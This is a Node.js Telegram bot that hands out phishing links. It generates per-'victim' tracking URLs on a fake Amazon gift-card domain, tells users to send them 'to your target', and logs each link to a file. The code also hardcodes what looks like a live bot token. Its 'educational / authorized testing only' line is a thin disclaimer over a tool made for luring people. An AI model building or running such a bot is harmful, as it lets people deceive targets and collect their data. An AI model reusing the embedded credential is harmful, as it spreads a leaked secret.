#!/usr/bin/env node
/**
 * TELEGRAM BOT TEMPLATE (Node.js)
 */

const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const path = require('path');

// ============================================================
// CONFIG — Environment Variable (BOT_TOKEN) ব্যবহার করুন
// ============================================================
const BOT_TOKEN = process.env.BOT_TOKEN || "8694051282:AAEiubd02kB0LHhpHTd5xAtromIRtiX7HEo";
const BASE_URL = process.env.BASE_URL || "https://freegiftcard-amazon.netlify.app/";

// Social Media Links
const YOUTUBE_URL = "https://t.me/ROHAN0DJ";
const WHATSAPP_URL = "https://whatsapp.com/channel/0029Vb8psS872WToTkVa550i";

const LINKS_FILE = path.join(__dirname, 'links.txt');
// ============================================================

if (!BOT_TOKEN) {
    console.error('❌ BOT_TOKEN missing! Set BOT_TOKEN in environment variables.');
    process.exit(1);
}

// Store user data (in-memory)
const userLinks = {};
const userVerified = {};

// Helper function: Generate unique ID
function generateVictimId() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 8; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Helper function: Save link to file
function saveLink(userId, victimId, victimLink) {
    const data = `${userId}|${victimId}|${victimLink}\n`;
    fs.appendFileSync(LINKS_FILE, data, 'utf8');
}

// ============================================================
// BOT INSTANCE
// ============================================================
const bot = new Telegraf(BOT_TOKEN);

// ============================================================
// WELCOME SCREEN
// ============================================================
bot.start(async (ctx) => {
    const user = ctx.from;

    const keyboard = Markup.inlineKeyboard([
        [Markup.button.url('📺 Join Channel', YOUTUBE_URL)],
        [Markup.button.url('💬 Join Group', WHATSAPP_URL)],
        [Markup.button.callback('✅ I Have Joined ✅', 'check_join')],
        [Markup.button.callback('🔹 Skip & Continue', 'skip_join')]
    ]);

    await ctx.replyWithMarkdown(
        `🎯 *WELCOME*\n\n` +
        `👤 Hello *${user.first_name}*!\n\n` +
        `📌 *Before using this bot:*\n` +
        `1️⃣ Join our Channel\n` +
        `2️⃣ Join our Group\n` +
        `3️⃣ Click 'I Have Joined' to verify\n\n` +
        `⚡ *Or click 'Skip & Continue' to use directly!*`,
        keyboard
    );
});

// ============================================================
// JOIN CHECK & VERIFICATION
// ============================================================
bot.action('check_join', async (ctx) => {
    await ctx.answerCbQuery();

    const userId = ctx.from.id;
    userVerified[userId] = true;

    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🎯 Generate Link', 'generate_link')],
        [Markup.button.url('📺 Channel', YOUTUBE_URL)],
        [Markup.button.url('💬 Group', WHATSAPP_URL)]
    ]);

    await ctx.editMessageText(
        `✅ *Verification Successful!*\n\n` +
        `🎉 You are now verified to use this bot.\n\n` +
        `📌 *Click the button below to generate your link.*`,
        {
            parse_mode: 'Markdown',
            ...keyboard
        }
    );
});

bot.action('skip_join', async (ctx) => {
    await ctx.answerCbQuery();

    const userId = ctx.from.id;
    userVerified[userId] = true;

    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🎯 Generate Link', 'generate_link')],
        [Markup.button.url('📺 Channel', YOUTUBE_URL)],
        [Markup.button.url('💬 Group', WHATSAPP_URL)]
    ]);

    await ctx.editMessageText(
        `⏭️ *Skipped Joining!*\n\n` +
        `✅ You can still use this bot freely.\n\n` +
        `📌 *Click the button below to generate your link.*`,
        {
            parse_mode: 'Markdown',
            ...keyboard
        }
    );
});

// ============================================================
// GENERATE LINK
// ============================================================
bot.action('generate_link', async (ctx) => {
    await ctx.answerCbQuery();

    const userId = ctx.from.id;

    // Generate unique ID
    const victimId = generateVictimId();
    userLinks[userId] = victimId;

    // Create link
    const victimLink = `${BASE_URL}?id=${victimId}&chat_id=${userId}`;

    // Save to file
    saveLink(userId, victimId, victimLink);

    const keyboard = Markup.inlineKeyboard([
        [Markup.button.url('📤 Share Link', `https://t.me/share/url?url=${encodeURIComponent(victimLink)}`)],
        [Markup.button.callback('📋 Copy Link', 'copy_link')],
        [Markup.button.callback('🔄 New Link', 'generate_link')],
        [Markup.button.url('📺 Channel', YOUTUBE_URL)],
        [Markup.button.url('💬 WhatsApp', WHATSAPP_URL)]
    ]);

    await ctx.editMessageText(
        `🎯 *LINK GENERATED!*\n\n` +
        `🆔 ID: \`${victimId}\`\n\n` +
        `🔗 *Your Link:*\n` +
        `\`${victimLink}\`\n\n` +
        `📌 *How to use:*\n` +
        `1️⃣ Share this link\n` +
        `2️⃣ Open in browser to test\n` +
        `3️⃣ Check stats with /stats\n\n` +
        `⚠️ *Use for educational / authorized testing only!*`,
        {
            parse_mode: 'Markdown',
            ...keyboard
        }
    );
});

// ============================================================
// COPY LINK
// ============================================================
bot.action('copy_link', async (ctx) => {
    await ctx.answerCbQuery();

    const userId = ctx.from.id;
    const victimId = userLinks[userId] || '';

    if (!victimId) {
        await ctx.reply('❌ No link found. Use /start');
        return;
    }

    const victimLink = `${BASE_URL}?id=${victimId}&chat_id=${userId}`;

    await ctx.replyWithMarkdown(
        `📋 *Copy this link:*\n\n` +
        `\`${victimLink}\`\n\n` +
        `Send it to your target.`
    );
});

// ============================================================
// STATS COMMAND
// ============================================================
bot.command('stats', async (ctx) => {
    const userId = ctx.from.id;
    const victimId = userLinks[userId] || 'Not generated';
    const verified = userVerified[userId] || false;

    // Count total links from file
    let total = 0;
    try {
        const data = fs.readFileSync(LINKS_FILE, 'utf8');
        total = data.split('\n').filter(line => line.trim() !== '').length;
    } catch (error) {
        total = 0;
    }

    await ctx.replyWithMarkdown(
        `📊 *Your Stats*\n\n` +
        `🆔 Your ID: \`${victimId}\`\n` +
        `📌 Total Generated: ${total}\n` +
        `✅ Verified: ${verified}\n\n` +
        `Type /start to get your link.`
    );
});

// ============================================================
// HELP COMMAND
// ============================================================
bot.command('help', async (ctx) => {
    await ctx.replyWithMarkdown(
        `🤖 *Bot Help*\n\n` +
        `📌 *Commands:*\n` +
        `/start - Welcome screen\n` +
        `/stats - Show stats\n` +
        `/help - Show this\n\n` +
        `📌 *How it works:*\n` +
        `1️⃣ Start bot → Welcome screen\n` +
        `2️⃣ Join or Skip → Get verified\n` +
        `3️⃣ Generate link → Share link\n` +
        `4️⃣ Track generated links via /stats`
    );
});

// ============================================================
// LAUNCH BOT
// ============================================================
console.log(`
╔═══════════════════════════════════════════╗
║         TELEGRAM BOT (Node.js)            ║
╚═══════════════════════════════════════════╝
`);
console.log('🤖 Bot starting...');
console.log('📺 Channel: ' + YOUTUBE_URL);
console.log('💬 Group: ' + WHATSAPP_URL);

bot.launch()
    .then(() => {
        console.log('✅ Bot is running!');
    })
    .catch((err) => {
        console.error('❌ Error starting bot:', err);
    });

// Enable graceful stop
process.once('SIGINT', () => {
    console.log('\n❌ Bot stopped');
    bot.stop('SIGINT');
});
process.once('SIGTERM', () => {
    console.log('\n❌ Bot stopped');
    bot.stop('SIGTERM');
});
